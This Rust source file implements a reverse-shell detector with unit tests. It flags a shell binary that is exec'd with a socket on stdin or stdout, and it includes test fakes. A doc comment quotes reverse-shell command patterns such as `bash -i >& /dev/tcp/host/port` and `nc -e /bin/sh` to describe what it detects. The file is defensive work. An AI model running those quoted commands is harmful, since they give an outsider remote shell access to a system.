/// Tells whether a pid's given fd is a socket. A reverse shell dup2()s its
/// socket onto fd 0/1/2 *before* calling execve, and those fds persist
/// across the exec, so checking them right after the shell's exec event
/// still sees the redirected fds.
pub trait FdKind {
    fn is_socket(&self, pid: u32, fd: u32) -> bool;
}

/// Real check via the `/proc/<pid>/fd/<fd>` symlink target, which the
/// kernel names `socket:[<inode>]` for a socket fd.
pub struct ProcFsFdKind;

impl FdKind for ProcFsFdKind {
    fn is_socket(&self, pid: u32, fd: u32) -> bool {
        std::fs::read_link(format!("/proc/{pid}/fd/{fd}"))
            .map(|target| target.to_string_lossy().starts_with("socket:"))
            .unwrap_or(false)
    }
}

const SHELL_BASENAMES: &[&str] = &["sh", "bash", "dash", "zsh", "ash", "ksh", "csh", "tcsh"];

pub struct ReverseShellAlert {
    pub pid: u32,
    pub uid: u32,
    pub path: String,
}

/// A shell binary exec'd with a socket already sitting on stdin or stdout —
/// the shape of `bash -i >& /dev/tcp/host/port 0>&1` and `nc -e /bin/sh`
/// style reverse shells. Stateless — checked at the moment of the shell's
/// own exec, not correlated against prior events.
pub struct ReverseShellDetector<F: FdKind> {
    fd_kind: F,
}

impl<F: FdKind> ReverseShellDetector<F> {
    pub fn new(fd_kind: F) -> Self {
        Self { fd_kind }
    }

    /// Call only for Exec events (the caller already has the decoded path).
    pub fn observe(&self, pid: u32, uid: u32, path: &str) -> Option<ReverseShellAlert> {
        let basename = path.rsplit('/').next().unwrap_or(path);
        if !SHELL_BASENAMES.contains(&basename) {
            return None;
        }
        if self.fd_kind.is_socket(pid, 0) || self.fd_kind.is_socket(pid, 1) {
            Some(ReverseShellAlert {
                pid,
                uid,
                path: path.to_owned(),
            })
        } else {
            None
        }
    }
}

#[cfg(test)]
mod tests {
    use std::collections::HashMap;

    use super::*;

    struct FakeFdKind(HashMap<(u32, u32), bool>);

    impl FdKind for FakeFdKind {
        fn is_socket(&self, pid: u32, fd: u32) -> bool {
            self.0.get(&(pid, fd)).copied().unwrap_or(false)
        }
    }

    #[test]
    fn flags_shell_with_socket_stdin() {
        let mut fds = HashMap::new();
        fds.insert((100, 0), true);
        let d = ReverseShellDetector::new(FakeFdKind(fds));
        let alert = d.observe(100, 0, "/bin/bash").expect("socket stdin on a shell should alert");
        assert_eq!(alert.pid, 100);
        assert_eq!(alert.path, "/bin/bash");
    }

    #[test]
    fn flags_shell_with_socket_stdout() {
        let mut fds = HashMap::new();
        fds.insert((100, 1), true);
        let d = ReverseShellDetector::new(FakeFdKind(fds));
        assert!(d.observe(100, 0, "/bin/sh").is_some());
    }

    #[test]
    fn ignores_shell_with_ordinary_fds() {
        let d = ReverseShellDetector::new(FakeFdKind(HashMap::new()));
        assert!(d.observe(100, 0, "/bin/bash").is_none());
    }

    #[test]
    fn ignores_non_shell_even_with_socket_stdin() {
        let mut fds = HashMap::new();
        fds.insert((100, 0), true);
        let d = ReverseShellDetector::new(FakeFdKind(fds));
        assert!(d.observe(100, 0, "/usr/bin/python3").is_none());
    }

    #[test]
    fn matches_shell_by_basename_regardless_of_directory() {
        let mut fds = HashMap::new();
        fds.insert((100, 0), true);
        let d = ReverseShellDetector::new(FakeFdKind(fds));
        assert!(d.observe(100, 0, "/usr/local/bin/zsh").is_some());
    }
}
